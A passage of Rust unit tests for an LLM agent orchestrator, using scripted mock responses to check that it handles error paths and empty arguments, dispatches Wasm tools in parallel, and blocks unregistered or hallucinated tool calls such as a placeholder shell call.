        // Round 2: LLM sees the error response and informs user
        text_response(
            "I'm unable to schedule intents right now as the scheduling system is not available.",
        ),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    // No intent engine set on orchestrator → should return error, not crash
    let result = orch
        .process_message("did:test:user1", "schedule something", None)
        .await
        .unwrap();

    assert_eq!(result.tools_called, vec!["schedule_intent"]);
    assert!(!result.reply.is_empty());
}

/// Hallucinated tool mixed with valid tool: LLM calls both a real pseudo-tool
/// and a hallucinated one in the same round.
#[tokio::test]
async fn react_mixed_valid_and_hallucinated_tools() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls valid + hallucinated tools in one message
        multi_tool_call_response(vec![
            ("call_a", "recall_memory", json!({"query": "test"})),
            ("call_b", "execute_shell", json!({"cmd": "whoami"})),
        ]),
        // Round 2: LLM sees recall_memory result + block message for execute_shell
        text_response("I found some memories but cannot execute shell commands."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "recall memories and run whoami", None)
        .await
        .unwrap();

    // recall_memory should succeed
    assert!(
        result.tools_called.contains(&"recall_memory".to_string()),
        "recall_memory should have been called"
    );
    // execute_shell should be blocked
    assert!(
        result.tools_blocked.contains(&"execute_shell".to_string()),
        "execute_shell should be blocked, got: {:?}",
        result.tools_blocked,
    );
}

/// Empty tool arguments: LLM calls a pseudo-tool with empty/invalid JSON args.
#[tokio::test]
async fn react_empty_tool_arguments() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls recall_memory with empty args
        tool_call_response("call_1", "recall_memory", json!({})),
        // Round 2: LLM responds after seeing result
        text_response("No specific memories found."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "recall everything", None)
        .await
        .unwrap();

    // Should handle empty args gracefully
    assert_eq!(result.tools_called, vec!["recall_memory"]);
    assert!(!result.reply.is_empty());
}

// ── Parallel Wasm tool dispatch tests ─────────────────────────────────────

/// LLM returns a single Wasm tool call → should still work (no parallelism overhead).
/// Verifies the single-tool fast path (`wasm_to_run.len() <= 1`).
#[tokio::test]
async fn react_parallel_single_wasm_fallback() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls one wasm tool
        multi_tool_call_response(vec![(
            "call_1",
            "test_no_net",
            json!({"text": "single task"}),
        )]),
        // Round 2: LLM final text
        text_response("Task done."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator_multi(addr, memory, settings, &["test_no_net"]);

    let result = orch
        .process_message("did:test:parallel3", "do one thing", None)
        .await
        .unwrap();

    assert_eq!(result.tools_called, vec!["test_no_net"]);
    assert!(result.tools_blocked.is_empty());
    assert_eq!(result.reply, "Task done.");
}

/// LLM returns a Wasm tool + hallucinated (unregistered) tool → the hallucinated
/// one is blocked, the real one executes.
#[tokio::test]
async fn react_parallel_wasm_with_hallucinated_tool() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls a real wasm tool + a hallucinated one
        multi_tool_call_response(vec![
            ("call_1", "test_no_net", json!({"text": "real task"})),
            ("call_2", "imaginary_tool", json!({"action": "hack"})),
        ]),
        // Round 2: LLM responds after seeing results
        text_response("Completed the real task. The other tool was not available."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator_multi(addr, memory, settings, &["test_no_net"]);

    let result = orch
        .process_message("did:test:parallel4", "do two things", None)
        .await
        .unwrap();

    assert!(
        result.tools_called.contains(&"test_no_net".to_string()),
        "real wasm tool should execute"
    );
    // The hallucinated tool goes through the pseudo-tool serial path
    // (is_pseudo_tool returns true for unregistered tools), then
    // execute_single_tool will fall through to execute_wasm_tool where
    // permission inversion blocks it.
    assert!(
        result.tools_blocked.contains(&"imaginary_tool".to_string()),
        "hallucinated tool should be blocked, got blocked: {:?}",
        result.tools_blocked,
    );
}
